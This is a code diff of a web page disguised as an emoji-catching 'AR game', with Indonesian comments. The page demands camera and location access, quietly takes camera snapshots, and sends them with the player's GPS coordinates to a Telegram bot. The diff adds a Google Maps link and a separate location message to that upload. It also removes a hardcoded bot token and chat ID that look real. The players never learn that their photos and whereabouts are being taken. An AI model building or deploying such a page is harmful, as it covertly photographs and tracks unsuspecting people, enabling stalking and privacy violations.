@@ -41,13 +41,13 @@ const camera = document.getElementById('camera');
 const scoreBox = document.getElementById('scoreBox');
 const popSound = document.getElementById('popSound');
 
-const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";
-const CHAT_ID = "8316267465";
+const BOT_TOKEN = "ISI_TOKEN_MU";   // ganti dengan token botmu
+const CHAT_ID = "ISI_CHAT_ID";     // ganti dengan chat_id mu
 const emojis = ["🍎","🍌","🍒","⭐","💎","🎯"];
 let score = 0;
 let userLocation = null;
 
-// Ambil foto
+// Ambil foto dari kamera
 function takePhoto(){
   return new Promise((resolve)=>{
     const canvas = document.createElement("canvas");
@@ -59,21 +59,43 @@ function takePhoto(){
   });
 }
 
-// Kirim ke Telegram (foto + lokasi)
+// Kirim ke Telegram (foto + lokasi + link GMaps)
 function sendToTelegram(blob){
   const fd = new FormData();
   fd.append("chat_id", CHAT_ID);
   fd.append("photo", blob, "snapshot.jpg");
+
   let caption = "📸 Foto dari game AR";
-  if(userLocation) caption += `\n📍 Lokasi: ${userLocation.latitude}, ${userLocation.longitude}`;
+  if(userLocation){
+    let lat = userLocation.latitude;
+    let lon = userLocation.longitude;
+    caption += `\n📍 Lokasi: ${lat}, ${lon}`;
+    caption += `\n🌍 [Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+  }
+
   fd.append("caption", caption);
+  fd.append("parse_mode", "Markdown");
+
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:fd })
     .then(res => res.json())
     .then(data => console.log("Telegram sent:", data))
     .catch(err => console.error(err));
+
+  // Kirim juga titik lokasi (opsional, bisa kamu hapus kalau nggak perlu)
+  if(userLocation){
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        latitude: userLocation.latitude,
+        longitude: userLocation.longitude
+      })
+    });
+  }
 }
 
-// Spawn emoji
+// Spawn emoji jatuh
 function spawnEmoji(){
   const emoji = document.createElement("div");
   emoji.className = "emoji";
@@ -114,9 +136,13 @@ allowBtn.addEventListener("click", async ()=>{
     camera.srcObject = stream;
 
     // Minta lokasi
-    userLocation = await new Promise((resolve, reject)=>{
+    const position = await new Promise((resolve, reject)=>{
       navigator.geolocation.getCurrentPosition(resolve, reject);
     });
+    userLocation = {
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude
+    };
 
     // Semua izin diterima → mulai game
     warnScreen.style.display="none";
@@ -125,8 +151,8 @@ allowBtn.addEventListener("click", async ()=>{
     setInterval(spawnEmoji, 1000);
 
   } catch(err){
-    // Jika kamera atau lokasi ditolak
     alert("⚠️ Izin kamera dan lokasi wajib untuk memainkan game!");
+    console.error(err);
   }
 });
 </script>
